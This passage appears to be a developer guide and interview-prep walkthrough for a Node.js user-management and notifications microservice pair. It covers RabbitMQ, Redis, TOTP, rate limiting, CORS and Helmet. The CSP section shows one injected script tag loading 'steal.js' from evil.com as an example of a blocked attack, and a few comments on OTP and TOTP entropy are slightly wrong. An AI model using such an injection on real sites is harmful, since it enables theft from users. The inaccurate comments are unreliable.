io.adapter(createAdapter(pubClient, subClient));

// What this does:
// 1. Creates Publisher client (sends messages)
// 2. Creates Subscriber client (receives messages)
// 3. When io.emit() called → publishes to Redis
// 4. Redis broadcasts to all subscribers
// 5. All servers emit to their connected clients
```

### Redis Client Management

```javascript
// File: notifications/config/redis.js

export const connectRedis = async () => {
  const redisUrl = REDIS_CONFIG.URL;

  // Create 3 separate clients (why?)
  redisClient = createClient({ url: redisUrl });
  redisPublisher = redisClient.duplicate();
  redisSubscriber = redisClient.duplicate();

  await redisClient.connect();
  await redisPublisher.connect();
  await redisSubscriber.connect();
};

// Why 3 clients?
// 1. redisClient: General purpose (caching, data storage)
// 2. redisPublisher: Dedicated for publishing messages
// 3. redisSubscriber: Dedicated for subscribing to channels

// Why separate?
// - Redis SUBSCRIBE blocks the connection
// - Can't run other commands on subscribed connection
// - Prevents deadlocks and connection issues
```

**Performance comparison:**

```javascript
// Without Redis adapter (Single server):
// - Supports: ~10,000 concurrent connections
// - Limitation: All users must connect to same server

// With Redis adapter (Multiple servers):
// - Supports: Unlimited connections
// - Example: 3 servers × 10,000 = 30,000 connections
// - Scales horizontally by adding more servers
```

---

## 🐰 RabbitMQ Consumer Implementation

### Consumer Setup

```javascript
// File: notifications/server.js

const bindConsumers = async () => {
  const ch = getRabbitChannel();
  const exchange = 'events';
  const queue = 'notifications.email';
  const routingKey = 'user.invite.created';

  // 1. Declare exchange (topic exchange)
  await ch.assertExchange(exchange, 'topic', { durable: true });

  // 2. Declare queue
  await ch.assertQueue(queue, { durable: true });

  // 3. Bind queue to exchange with routing key
  await ch.bindQueue(queue, exchange, routingKey);

  // 4. Start consuming
  ch.consume(queue, async (msg) => {
    if (!msg) return;
    
    try {
      const payload = JSON.parse(msg.content.toString());
      const { to, subject, html, text } = payload;
      
      await sendEmail({ to, subject, html, text });
      
      // Acknowledge message (remove from queue)
      ch.ack(msg);
      
    } catch (err) {
      logger.error('Consumer error', { error: err.message });
      
      // Negative acknowledge (requeue or dead-letter)
      ch.nack(msg, false, false);
    }
  });
};
```

### RabbitMQ Concepts Explained

**1. Exchange Types:**

```javascript
// Topic Exchange (what we use)
await ch.assertExchange('events', 'topic', { durable: true });

// Routing patterns:
'user.invite.created'  → Matches 'user.invite.created'
'user.invite.*'        → Matches any invite event
'user.#'               → Matches ALL user events

// Why topic exchange?
// - Flexible routing
// - Can have multiple queues for same event
// - Example:
//   - Email queue listens to 'user.invite.*'
//   - Analytics queue listens to 'user.#'
//   - Both receive invite events!
```

**2. Durable Queues:**

```javascript
await ch.assertQueue('notifications.email', { durable: true });

// What does durable mean?
// - Queue survives RabbitMQ restart
// - Messages persist to disk
// - Won't lose emails if RabbitMQ crashes

// Without durable:
// RabbitMQ crashes → Queue deleted → All messages lost ❌

// With durable:
// RabbitMQ crashes → Restarts → Queue still exists ✅
```

**3. Message Acknowledgment:**

```javascript
ch.consume(queue, async (msg) => {
  try {
    await sendEmail(...);
    ch.ack(msg);  // ✅ Success! Remove from queue
  } catch (err) {
    ch.nack(msg, false, false);  // ❌ Failed! Don't requeue
  }
});

// Acknowledgment modes:

// 1. ack(msg)
// → "I processed it successfully, remove from queue"

// 2. nack(msg, false, true)
// → "I failed, put it back in queue for retry"
// → Message goes to end of queue

// 3. nack(msg, false, false)
// → "I failed, don't retry, send to dead-letter queue"
// → Prevents infinite retry loops

// 4. Auto-ack (don't use in production!)
ch.consume(queue, handler, { noAck: true });
// → Message removed immediately
// → If processing fails, message lost!
```

**4. Confirm Channels:**

```javascript
// File: notifications/config/rabbitmq.js

channel = await connection.createConfirmChannel();

// Why confirm channel?
// - Regular channel: publish() doesn't confirm delivery
// - Confirm channel: Waits for broker acknowledgment

// Example:
channel.publish(exchange, routingKey, payload, {}, (err) => {
  if (err) {
    logger.error('Publish failed!');
    // Can implement retry logic
  } else {
    logger.info('Publish confirmed!');
  }
});

// Use case:
// - Critical messages (emails, payments)
// - Need guarantee that RabbitMQ received message
```

### Dead Letter Queue Strategy

```javascript
// Advanced: Set up dead letter queue for failed messages

await ch.assertQueue('notifications.email', {
  durable: true,
  arguments: {
    'x-dead-letter-exchange': 'dlx.events',
    'x-dead-letter-routing-key': 'dead.email',
    'x-message-ttl': 86400000  // 24 hours
  }
});

// Flow:
// 1. Message consumed from 'notifications.email'
// 2. Processing fails
// 3. nack(msg, false, false) → Don't requeue
// 4. RabbitMQ sends to dead-letter exchange
// 5. Message ends up in 'dead.email' queue
// 6. Admin can investigate failed messages

// Why useful?
// - Debugging failed email deliveries
// - Manual retry after fixing issue
// - Prevents poison messages from blocking queue
```

---

## 🛠️ Utility Functions Deep Dive

### 1. OTP Utility

```javascript
// File: userManagement/utils/otp.js

export const generateOTP = () => {
  return crypto.randomInt(100000, 999999).toString();
};

// Why crypto.randomInt()?
// ❌ Bad: Math.random() → Predictable, not cryptographically secure
// ✅ Good: crypto.randomInt() → Cryptographically secure random

// Why 100000 to 999999?
// - Ensures always 6 digits
// - 100000 is minimum (not 000001)
// - 999999 is maximum

// Alternative approaches:
// Bad: Math.floor(Math.random() * 1000000).toString().padStart(6, '0')
// - Uses Math.random() (insecure)
// - More complex

// Why toString()?
// - Returns string "123456" not number 123456
// - Leading zeros preserved (if any)
// - Easier to compare and display
```

```javascript
export const hashOTP = async (otp) => {
  const salt = await bcrypt.genSalt(BCRYPT_SALT_ROUNDS.OTP);
  return await bcrypt.hash(otp, salt);
};

// Why hash OTP?
// - Stored in database
// - If database compromised, attacker can't see OTP
// - Even if user receives email, OTP in DB is hashed

// Why 10 rounds for OTP vs 12 for password?
// - OTP is temporary (10 min expiry)
// - Lower security requirement than passwords
// - Faster hashing (better UX)
// - Still secure enough for short-lived tokens
```

```javascript
export const getOTPExpiry = () => {
  return new Date(Date.now() + TOKEN_EXPIRY.OTP);
};

// Why return Date object?
// - MongoDB stores as Date
// - Can compare: Date.now() > user.otpExpiry
// - Automatic time zone handling
```

---

### 2. TOTP Utility

```javascript
// File: userManagement/utils/totp.js

export const generateTOTPSecret = (email) => {
  const secret = speakeasy.generateSecret({
    name: `UserManagementService (${email})`,
    length: 32
  });

  return {
    secret: secret.base32,
    otpauthUrl: secret.otpauth_url
  };
};

// Why include email in name?
// - Shows in Google Authenticator app
// - User sees: "UserManagementService (alice@example.com)"
// - Helps users with multiple accounts

// Why length 32?
// - Default is 20
// - 32 provides 160 bits of entropy
// - More secure, still compatible with all apps

// Why base32 encoding?
// - URL-safe
// - Case-insensitive
// - Compatible with Google Authenticator
// - QR codes use base32
```

```javascript
export const verifyTOTPToken = (token, secret) => {
  return speakeasy.totp.verify({
    secret: secret,
    encoding: 'base32',
    token: token,
    window: 2
  });
};

// What is window?
// - Time tolerance in steps (30-second intervals)
// - window: 2 means ±60 seconds
// 
// Example:
// Current time: 10:00:00
// Valid codes:
//   - 09:59:00 to 09:59:29 (window -2)
//   - 09:59:30 to 09:59:59 (window -1)
//   - 10:00:00 to 10:00:29 (current)
//   - 10:00:30 to 10:00:59 (window +1)
//   - 10:01:00 to 10:01:29 (window +2)

// Why window: 2?
// - Accounts for clock drift
// - User's phone clock slightly off
// - Network latency
// - User typing time

// Without window:
// - User generates code at 10:00:29
// - Types it by 10:00:31
// - Code invalid! ❌ Bad UX

// With window: 2:
// - 60 seconds grace period
// - Better user experience ✅
```

```javascript
export const generateQRCode = async (otpauthUrl) => {
  return await QRCode.toDataURL(otpauthUrl);
};

// What is otpauthUrl?
// otpauth://totp/UserManagement:alice@example.com?secret=JBSWY3DPEHPK3PXP&issuer=UserManagement

// Parts:
// - otpauth:// → URL scheme for authenticator apps
// - totp → Time-based OTP (vs hotp for counter-based)
// - UserManagement:alice@example.com → Label
// - secret=... → The shared secret
// - issuer=... → Service name

// toDataURL() returns:
// "data:image/png;base64,iVBORw0KGgoAAAANS..."
// - Can be used directly in <img src="...">
// - Frontend displays QR code
// - User scans with phone
```

---

### 3. Socket Client Utility

```javascript
// File: userManagement/utils/socketClient.js

export const initSocketClient = () => {
  if (socketClient) return socketClient;

  const NOTIFICATION_SERVICE_URL = 'http://localhost:4000';

  socketClient = io(NOTIFICATION_SERVICE_URL, {
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  });

  // Event listeners...
  return socketClient;
};

// Why singleton pattern?
// - Only one Socket.IO client per service
// - Prevents multiple connections
// - Reuses existing connection

// Reconnection strategy:
// - reconnection: true → Auto-reconnect on disconnect
// - reconnectionDelay: 1000 → Wait 1 second before retry
// - reconnectionAttempts: 10 → Try 10 times max

// Retry timeline:
// Connection lost
// → Wait 1 second → Retry 1
// → Wait 1 second → Retry 2
// → ...
// → Wait 1 second → Retry 10
// → Give up

// Why 10 attempts?
// - Handles temporary network issues
// - Doesn't retry forever (waste resources)
// - If notification service down for >10 seconds, stop
```

```javascript
export const emitInviteAccepted = (inviterId, inviteeEmail, role) => {
  try {
    const client = getSocketClient();
    client.emit('inviteAccepted', {
      userId: inviterId,
      message: `${inviteeEmail} has accepted their invitation as ${role}`,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    logger.error('Failed to emit event', { error: error.message });
  }
};

// Why try-catch?
// - Socket might not be connected
// - Notification service might be down
// - Don't crash user management service!
// - Invite creation still succeeds

// Fire-and-forget pattern:
// - Emit event and move on
// - Don't wait for acknowledgment
// - If notification fails, it's not critical
// - User still invited successfully
```

---

### 4. Response Helpers

```javascript
// File: userManagement/utils/response.js

export const ok = (res, payload = {}, meta = {}) => {
  return res.json({ success: true, ...payload, ...meta });
};

export const created = (res, payload = {}, meta = {}) => {
  return res.status(201).json({ success: true, ...payload, ...meta });
};

export const badRequest = (res, message, errors) => {
  return res.status(400).json({ success: false, message, errors });
};

// Why these helpers?

// Without helpers:
return res.status(200).json({
  success: true,
  accessToken: token,
  user: user
});

// With helpers:
return ok(res, { accessToken: token, user });

// Benefits:
// 1. Consistent response format
{
  success: true,  // Always present
  ...data         // Variable data
}

// 2. Correct status codes
// - ok() → 200
// - created() → 201
// - badRequest() → 400
// - unauthorized() → 401

// 3. DRY (Don't Repeat Yourself)
// - One place to change response format
// - Easy to add fields (requestId, timestamp, etc.)

// 4. Type safety (if using TypeScript)
// - Ensures consistent structure
```

**Consistent Error Format:**

```javascript
// All errors return same structure:
{
  success: false,
  message: "Error description",
  errors: [...]  // Optional validation errors
}

// Example responses:

// Success:
{
  "success": true,
  "accessToken": "eyJ...",
  "user": {...}
}

// Validation error:
{
  "success": false,
  "message": "Validation failed",
  "errors": [
    { "field": "email", "message": "Invalid email format" }
  ]
}

// Auth error:
{
  "success": false,
  "message": "Invalid credentials"
}

// Frontend can handle consistently:
if (response.success) {
  // Handle success
} else {
  showError(response.message);
}
```

---

### 5. Logger Implementation

```javascript
// File: userManagement/utils/logger.js

const formatMessage = (level, message, meta = {}) => {
  const timestamp = new Date().toISOString();
  const color = colors[level] || '';
  const reset = colors.RESET;

  let logMessage = `${color}[${timestamp}] [${level}]${reset} ${message}`;

  if (Object.keys(meta).length > 0) {
    logMessage += ` ${JSON.stringify(meta)}`;
  }

  return logMessage;
};

export const logger = {
  error: (message, meta = {}) => {
    console.error(formatMessage(LOG_LEVELS.ERROR, message, meta));
  },
  
  warn: (message, meta = {}) => {
    console.warn(formatMessage(LOG_LEVELS.WARN, message, meta));
  },
  
  info: (message, meta = {}) => {
    console.log(formatMessage(LOG_LEVELS.INFO, message, meta));
  },
  
  debug: (message, meta = {}) => {
    if (process.env.NODE_ENV === 'development') {
      console.log(formatMessage(LOG_LEVELS.DEBUG, message, meta));
    }
  }
};

// Why custom logger vs console.log?

// 1. Structured logging
logger.info('User logged in', { userId: '123', ip: '192.168.1.1' });
// Output: [2025-01-01T10:00:00.000Z] [INFO] User logged in {"userId":"123","ip":"192.168.1.1"}

// vs console.log:
console.log('User logged in', user.id, req.ip);
// Output: User logged in 123 192.168.1.1
// ❌ Harder to parse
// ❌ No timestamp
// ❌ No log level

// 2. Log levels
// - error: Critical issues
// - warn: Warnings
// - info: General information
// - debug: Detailed debugging (dev only)

// 3. Color-coded output
// - Red for errors
// - Yellow for warnings
// - Cyan for info
// - Gray for debug

// 4. Conditional logging
// debug() only logs in development
// Prevents verbose logs in production

// 5. Metadata support
logger.error('Payment failed', {
  userId: user._id,
  amount: 100,
  error: err.message
});
// Structured data → Easy to search in log management tools

// 6. Future extensibility
// Can easily add:
// - File logging
// - External logging services (Datadog, Sentry)
// - Log rotation
// - Log filtering
```

**Production Logging Upgrade:**

```javascript
// For production, use winston or pino:

import winston from 'winston';

export const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    // Write logs to files
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' }),
    
    // Send to external service
    new winston.transports.Http({
      host: 'logs.example.com',
      port: 8080
    })
  ]
});

// Benefits:
// - Persistent logs (survive crashes)
// - Centralized log aggregation
// - Search and analysis
// - Alerting on errors
```

---

## ✅ Validation Middleware Deep Dive

```javascript
// File: userManagement/middleware/validation.js

import { body, validationResult } from 'express-validator';

export const validate = (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      message: 'Validation failed',
      errors: errors.array()
    });
  }
  next();
};

export const loginValidation = [
  body('email').isEmail().normalizeEmail().withMessage('Valid email is required'),
  body('password').notEmpty().withMessage('Password is required'),
  validate
];

// How it works:

// 1. Validation chain
router.post('/login', loginValidation, login);

// 2. Express-validator runs checks
body('email').isEmail()
// - Checks if email is valid format
// - Rejects: "notanemail", "test@", "@example.com"
// - Accepts: "user@example.com"

body('email').normalizeEmail()
// - Converts to lowercase
// - Removes dots in Gmail (test.user@gmail.com → testuser@gmail.com)
// - Standardizes format

// 3. validate() middleware runs
const errors = validationResult(req);
// - Collects all validation errors
// - If errors exist, returns 400
// - If no errors, calls next()

// 4. Controller runs (if validation passed)
```

### Password Validation

```javascript
export const acceptInviteValidation = [
  body('password')
    .isLength({ min: 8 })
    .withMessage('Password must be at least 8 characters')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/)
    .withMessage('Password must contain uppercase, lowercase, and number'),
  validate
];

// Regex breakdown:
// ^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)
//
// ^             → Start of string
// (?=.*[a-z])   → Must contain at least one lowercase letter
// (?=.*[A-Z])   → Must contain at least one uppercase letter
// (?=.*\d)      → Must contain at least one digit
//
// Examples:
// "password" → ❌ No uppercase, no number
// "Password" → ❌ No number
// "Password1" → ✅ Has all requirements

// Why these requirements?
// - OWASP password guidelines
// - Balance security vs usability
// - Prevents common weak passwords
```

### Validation Error Response

```javascript
// Request with validation errors:
POST /api/auth/login
{
  "email": "notanemail",
  "password": ""
}

// Response:
{
  "success": false,
  "message": "Validation failed",
  "errors": [
    {
      "type": "field",
      "value": "notanemail",
      "msg": "Valid email is required",
      "path": "email",
      "location": "body"
    },
    {
      "type": "field",
      "value": "",
      "msg": "Password is required",
      "path": "password",
      "location": "body"
    }
  ]
}

// Frontend can display field-specific errors:
errors.forEach(err => {
  showErrorOnField(err.path, err.msg);
});
```

---

## 🔐 Security Headers (Helmet)

```javascript
// File: userManagement/server.js

app.use(helmet({
  contentSecurityPolicy: false  // Disabled for Swagger UI
}));

// What does Helmet do?
// Sets security-related HTTP headers

// Headers added:

// 1. X-Content-Type-Options: nosniff
// - Prevents MIME type sniffing
// - Browser won't guess file types
// - Prevents attacks via file upload

// 2. X-Frame-Options: SAMEORIGIN
// - Prevents clickjacking
// - Page can only be iframed by same origin
// - Protects against UI redress attacks

// 3. X-XSS-Protection: 1; mode=block
// - Enables browser's XSS filter
// - Blocks page if XSS detected

// 4. Strict-Transport-Security
// - Forces HTTPS
// - Prevents downgrade attacks
// - max-age=15552000 (180 days)

// 5. X-Download-Options: noopen
// - IE-specific
// - Prevents downloads from opening directly

// Why disable CSP for Swagger?
// Content Security Policy blocks inline scripts
// Swagger UI uses inline scripts
// In production, use CSP but whitelist Swagger
```

**Content Security Policy Example:**

```javascript
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],  // Swagger needs inline styles
    scriptSrc: ["'self'", "'unsafe-inline'"],  // Swagger needs inline scripts
    imgSrc: ["'self'", "data:", "https:"]
  }
}));

// CSP directives:
// - defaultSrc: Default policy for all resource types
// - styleSrc: Where styles can be loaded from
// - scriptSrc: Where scripts can be loaded from
// - imgSrc: Where images can be loaded from

// Example attack prevented:
// Attacker injects:
<script src="https://evil.com/steal.js"></script>

// Browser checks CSP:
// scriptSrc: ["'self'"]
// → Only allow scripts from same origin
// → Blocked! ✅
```

---

## 🌐 CORS Configuration

```javascript
app.use(cors({
  origin: process.env.CORS_ORIGIN || '*',
  credentials: true
}));

// What is CORS?
// Cross-Origin Resource Sharing
// Browser security feature

// Scenario:
// Frontend: http://localhost:5173
// Backend: http://localhost:3000

// Without CORS:
// Frontend makes request → Browser blocks ❌
// Error: "No 'Access-Control-Allow-Origin' header"

// With CORS:
// Backend sets header: Access-Control-Allow-Origin: http://localhost:5173
// Frontend makes request → Browser allows ✅

// credentials: true means:
// - Allow cookies
// - Allow Authorization header
// - Required for authenticated requests

// Security considerations:

// ❌ Insecure (don't use in production):
origin: '*'
// Allows ANY website to call your API

// ✅ Secure:
origin: 'https://yourapp.com'
// Only your frontend can call API

// ✅ Multiple origins:
origin: ['https://yourapp.com', 'https://admin.yourapp.com']

// ✅ Dynamic (advanced):
origin: (origin, callback) => {
  const whitelist = ['https://yourapp.com', 'https://admin.yourapp.com'];
  if (whitelist.indexOf(origin) !== -1) {
    callback(null, true);
  } else {
    callback(new Error('Not allowed by CORS'));
  }
}
```

---

## ⚡ Rate Limiting

```javascript
// File: userManagement/server.js

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                   // 100 requests per window
  standardHeaders: true,
  legacyHeaders: false,
  message: 'Too many requests, please try again later.'
});

app.use('/api/', limiter);

// How it works:

// 1. User makes request
// 2. Rate limiter checks:
//    - IP address: 192.168.1.1
//    - Current window: 10:00 - 10:15
//    - Request count: 95
// 3. Increments counter: 96
// 4. 96 < 100 → Allow request ✅

// Request 101:
// 101 > 100 → Block request ❌
// Response: 429 Too Many Requests

// Headers sent:
RateLimit-Limit: 100
RateLimit-Remaining: 4
RateLimit-Reset: 1640000000

// Frontend can show:
"You have 4 requests remaining. Resets at 10:15"
```

**Auth-specific Rate Limiting:**

```javascript
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 50,
  skipSuccessfulRequests: true,
  message: 'Too many login attempts, please try again later.'
});

app.use('/api/auth/login', authLimiter);

// Why separate rate limit for auth?
// - Login is expensive (bcrypt comparison)
// - Target for brute-force attacks
// - Lower limit (50 vs 100)
//
// skipSuccessfulRequests: true
// - Only count failed logins
// - Legitimate users not penalized
// - Attackers hit limit quickly

// Example:
// User tries wrong password 50 times → Blocked
// User tries correct password 100 times → Allowed
```

**Preventing Brute Force:**

```javascript
// Scenario: Attacker tries to guess password

// Request 1: password123 → Failed (count: 1)
// Request 2: password456 → Failed (count: 2)
// ...
// Request 50: password999 → Failed (count: 50)
// Request 51: admin123 → Blocked ❌

// 15 minutes later:
// Counter resets → Can try again

// Additional protection (advanced):
// - Account lockout after 5 failed attempts
// - CAPTCHA after 3 failed attempts
// - 2FA requirement
// - IP blacklisting for repeat offenders
```

---

## 💾 Database Connection Management

```javascript
// File: userManagement/config/database.js

export const connectDatabase = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI);
    
    logger.info('MongoDB connected successfully');

    mongoose.connection.on('error', (err) => {
      logger.error('MongoDB connection error', { error: err.message });
    });

  } catch (error) {
    logger.error('MongoDB connection failed', { error: error.message });
    process.exit(1);
  }
};

// Why process.exit(1)?
// - Can't run app without database
// - Exit immediately with error code
// - PM2/Docker will restart service
// - Better than running with broken DB connection

// Connection event handlers:

mongoose.connection.on('connected', () => {
  logger.info('MongoDB connected');
});

mongoose.connection.on('disconnected', () => {
  logger.warn('MongoDB disconnected');
});

mongoose.connection.on('error', (err) => {
  logger.error('MongoDB error', { error: err.message });
});

// Why event handlers?
// - Monitor connection health
// - Log reconnection attempts
// - Alert if connection drops
```

**Connection Options (Production):**

```javascript
await mongoose.connect(process.env.MONGODB_URI, {
  maxPoolSize: 10,        // Max 10 connections in pool
  minPoolSize: 2,         // Min 2 connections always
  socketTimeoutMS: 45000, // Close sockets after 45s
  serverSelectionTimeoutMS: 5000,  // Timeout after 5s
  family: 4               // Use IPv4
});

// Why connection pooling?
// - Creating new connection is expensive (~100ms)
// - Reuse existing connections
// - maxPoolSize: 10 → Handle 10 concurrent queries
// - minPoolSize: 2 → Always 2 connections ready

// Connection pool example:
Request 1 → Gets Connection #1
Request 2 → Gets Connection #2
Request 3 → Creates Connection #3 (pool grows)
Request 1 completes → Connection #1 returns to pool
Request 4 → Reuses Connection #1 (no creation delay!)
```

---

## 🚦 Graceful Shutdown

```javascript
// File: userManagement/server.js

process.on('SIGTERM', async () => {
  logger.info('SIGTERM signal received: closing server gracefully');
  
  // 1. Stop accepting new requests
  server.close(() => {
    logger.info('HTTP server closed');
  });
  
  // 2. Close database connections
  await mongoose.connection.close();
  
  // 3. Close RabbitMQ connections
  await disconnectRabbit();
  
  // 4. Exit process
  process.exit(0);
});

process.on('SIGINT', async () => {
  // Same as SIGTERM (Ctrl+C in terminal)
});

// What is SIGTERM?
// - Signal sent by orchestrators (Docker, Kubernetes)
// - "Please shut down gracefully"
// - Has 30 seconds to complete (default)

// Why graceful shutdown?

// Without graceful shutdown:
// 1. Kill signal → Process dies immediately
// 2. In-flight requests → Lost ❌
// 3. Database connections → Not closed (connection leaks)
// 4. Files → Not flushed (data loss)

// With graceful shutdown:
// 1. SIGTERM received
// 2. Stop accepting new requests
// 3. Wait for in-flight requests to complete
// 4. Close all connections properly
// 5. Exit cleanly ✅

// Timeline:
// 10:00:00 - SIGTERM received
// 10:00:00 - Stop accepting new requests
// 10:00:05 - Last request completes
// 10:00:05 - Close database connection
// 10:00:06 - Close RabbitMQ connection
// 10:00:07 - Exit (total: 7 seconds)
```

---

## 📊 Environment Configuration

### Environment Variables Best Practices

```javascript
// File: userManagement/.env

# Server
PORT=3000
NODE_ENV=development

# Database
MONGODB_URI=mongodb://localhost:27017/usermanagement

# JWT
JWT_ACCESS_SECRET=your-secret-key-change-in-production
JWT_ACCESS_EXPIRY=15m

# Services
NOTIFICATION_SERVICE_URL=http://localhost:4000
RABBITMQ_URL=amqp://localhost:5672
FRONTEND_URL=http://localhost:5173

# Email
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=your-email@gmail.com
SMTP_PASS=your-app-password

# CORS
CORS_ORIGIN=http://localhost:5173

// Why .env files?
// 1. Keep secrets out of code
// 2. Different configs for dev/staging/prod
// 3. Easy to change without code changes
// 4. Never commit to git (.gitignore)

// Security rules:
// ✅ Use .env for local development
// ✅ Use environment variables in production (Docker, Kubernetes)
// ❌ Never commit .env to git
// ❌ Never hardcode secrets in code
```

### Configuration Loading

```javascript
// File: server.js

import dotenv from 'dotenv';
dotenv.config();

// Loads .env file into process.env
// process.env.PORT → '3000'
// process.env.MONGODB_URI → 'mongodb://...'

// Fallback values:
const PORT = process.env.PORT || 3000;
// - Use PORT from .env if exists
// - Otherwise use 3000

// Required variables:
if (!process.env.JWT_ACCESS_SECRET) {
  logger.error('JWT_ACCESS_SECRET is required!');
  process.exit(1);
}

// Why check required variables?
// - Fail fast at startup
// - Better than runtime errors
// - Clear error message
```

**Production Environment:**

```bash
# Production deployment (Docker)
docker run -e MONGODB_URI=mongodb://prod:27017/db \
           -e JWT_ACCESS_SECRET=prod-secret-key \
           -e NODE_ENV=production \
           myapp

# Production deployment (Kubernetes)
apiVersion: v1
kind: Secret
metadata:
  name: app-secrets
data:
  JWT_ACCESS_SECRET: base64-encoded-secret

# Benefits:
# - Secrets managed by orchestrator
# - Can't accidentally commit
# - Different secrets per environment
# - Easy rotation
```

---

## 🎯 Additional Interview Questions

### Q15: Why separate User Management and Notifications into different services?

**Answer:**

**Microservices Benefits:**

1. **Independent Scaling**
   ```javascript
   // Scenario: Black Friday sale
   // - Sending thousands of emails
   // - But user logins are normal
   
   // Scale Notifications service:
   3 instances × Notification service → Handle email load
   1 instance × User Management → Sufficient for logins
   
   // Cost savings:
   // Only scale what you need!
   ```

2. **Technology Freedom**
   ```javascript
   // User Management: Node.js + MongoDB
   // Notifications: Could be Node.js, Python, Go, etc.
   // Each service uses best tool for the job
   
   // Example: Switch to Python for ML-based email personalization
   // No need to change User Management service
   ```

3. **Fault Isolation**
   ```javascript
   // If Notifications service crashes:
   // - User Management still works ✅
   // - Users can still login
   // - Invites still created
   // - Only email sending affected
   
   // Monolith: One crash → Everything down ❌
   ```

4. **Independent Deployment**
   ```javascript
   // Update Notifications service:
   // - Deploy new version
   // - User Management unaffected
   // - No downtime for logins
   
   // Monolith: Deploy entire app
   // - Everything restarts
   // - All features down during deployment
   ```

5. **Team Autonomy**
   ```javascript
   // Team A: User Management
   // - Focus on auth, RBAC, invites
   
   // Team B: Notifications
   // - Focus on emails, real-time, messaging
   
   // Teams work independently
   // Faster development
   ```

**Trade-offs:**

```javascript
// Monolith advantages:
// ✅ Simpler deployment
// ✅ Easier debugging
// ✅ No network latency between services
// ✅ Simpler transactions

// Microservices advantages:
// ✅ Independent scaling
// ✅ Technology flexibility
// ✅ Fault isolation
// ✅ Team autonomy

// When to use each?
// - Monolith: Small teams, simple app, rapid prototyping
// - Microservices: Large teams, complex domain, high scale
```

---

### Q16: How do you handle database transactions across microservices?

**Answer:**

```javascript
// Problem: Distributed transactions

// Scenario: Create invite + Send email

// Option 1: Two-Phase Commit (2PC)
// Step 1: Prepare phase
await userManagement.prepareCreateInvite();
await notifications.prepareSendEmail();

// Step 2: Commit phase
await userManagement.commitCreateInvite();
await notifications.commitSendEmail();

// Problems with 2PC:
// ❌ Complex implementation
// ❌ Performance overhead
// ❌ Locking issues
// ❌ What if coordinator crashes?

// Option 2: Saga Pattern (our approach)
// Each service does local transaction
// Use compensating transactions for rollback

// Success flow:
1. User Management: Create invite → SUCCESS
2. Publish event to RabbitMQ
3. Notifications: Send email → SUCCESS
4. Done ✅

// Failure flow:
1. User Management: Create invite → SUCCESS
2. Publish event to RabbitMQ
3. Notifications: Send email → FAILED ❌
4. Publish failure event
5. User Management: Mark invite as "email_failed"
6. Retry later or manual intervention

// Why this works:
// - Eventual consistency
// - No distributed locks
// - Simple to implement
// - Each service independent
```

**Our Implementation:**

```javascript
// File: userManagement/services/inviteService.js

async createInvite(email, role) {
  // 1. Create invite (local transaction)
  const invite = await inviteRepo.create({
    email,
    role,
    token,
    status: 'pending'
  });
  
  // 2. Try to send email (fire-and-forget)
  try {
    await sendInviteEmail(email, token);
  } catch (error) {
    logger.warn('Email sending failed', { error });
    // Invite still created!
    // Email will be retried via RabbitMQ
  }
  
  // 3. Publish to RabbitMQ (background)
  try {
    await publishEvent('events', 'user.invite.created', {
      to: email,
      token
    });
  } catch (error) {
    logger.warn('RabbitMQ publish failed', { error });
    // Not critical - HTTP email sent already
  }
  
  return invite;
}

// Design principles:
// 1. Main business logic succeeds (invite created)
// 2. Side effects are optional (email sending)
// 3. Retry mechanism via message queue
// 4. No blocking on external services
```

---

### Q17: What happens if RabbitMQ is down?

**Answer:**

```javascript
// File: userManagement/server.js

if (process.env.RABBITMQ_URL) {
  try {
    await connectRabbit();
  } catch (err) {
    logger.warn('RabbitMQ connection failed, continuing without it');
    // Service starts anyway!
  }
}

// Degraded mode:
// ✅ User Management works
// ✅ Invites created
// ✅ HTTP email still sent (via notificationClient)
// ❌ RabbitMQ events not published

// Email still sent via HTTP fallback:
try {
  await axios.post('http://notification:4000/api/email/send', {
    to: email,
    subject: 'Invitation',
    html: '...'
  });
} catch (error) {
  logger.error('HTTP email also failed', { error });
  // Now we have a problem - but invite still created
  // Can retry manually or via admin panel
}

// Why this design?
// - RabbitMQ is nice-to-have, not critical
// - Async processing is optimization
// - Synchronous HTTP fallback works
// - Service availability > Perfect messaging
```

**Recovery:**

```javascript
// When RabbitMQ comes back online:

// Option 1: Automatic reconnection
connection.on('close', () => {
  setTimeout(async () => {
    try {
      await connectRabbit();
      logger.info('RabbitMQ reconnected!');
    } catch (err) {
      // Retry again
    }
  }, 5000);
});

// Option 2: Store-and-forward pattern
// Store failed messages in database
// Retry when RabbitMQ available

const failedMessages = await FailedMessage.find({ status: 'pending' });
for (const msg of failedMessages) {
  try {
    await publishEvent(msg.exchange, msg.routingKey, msg.payload);
    await FailedMessage.updateOne({ _id: msg._id }, { status: 'sent' });
  } catch (err) {
    // Still failing, try later
  }
}
```

---

## 🎯 Final Comprehensive Summary

### Service Responsibilities

**User Management Service:**
- ✅ User authentication (JWT)
- ✅ Authorization (RBAC)
- ✅ Two-factor authentication (OTP/TOTP)
- ✅ Invitation management
- ✅ Organization management
- ✅ User CRUD operations
- ✅ Session management (refresh tokens)
- ✅ Publishing events (RabbitMQ)
- ✅ Emitting real-time events (Socket.IO client)

**Notifications Service:**
- ✅ Email sending (SMTP via Nodemailer)
- ✅ Real-time notifications (Socket.IO server)
- ✅ Message queue consumption (RabbitMQ)
- ✅ Scalable real-time with Redis Pub/Sub
- ✅ Notification delivery tracking
- ✅ Email template management

### Data Flow Examples

**Example 1: User Login with 2FA**
```
1. POST /api/auth/login
   ├─ Validate email/password
   ├─ Generate OTP
   ├─ Hash OTP → Save to database
   ├─ HTTP → Notification service → Send email
   ├─ RabbitMQ → Queue email (background)
   └─ Response: { requiresTwoFactor: true, userId }

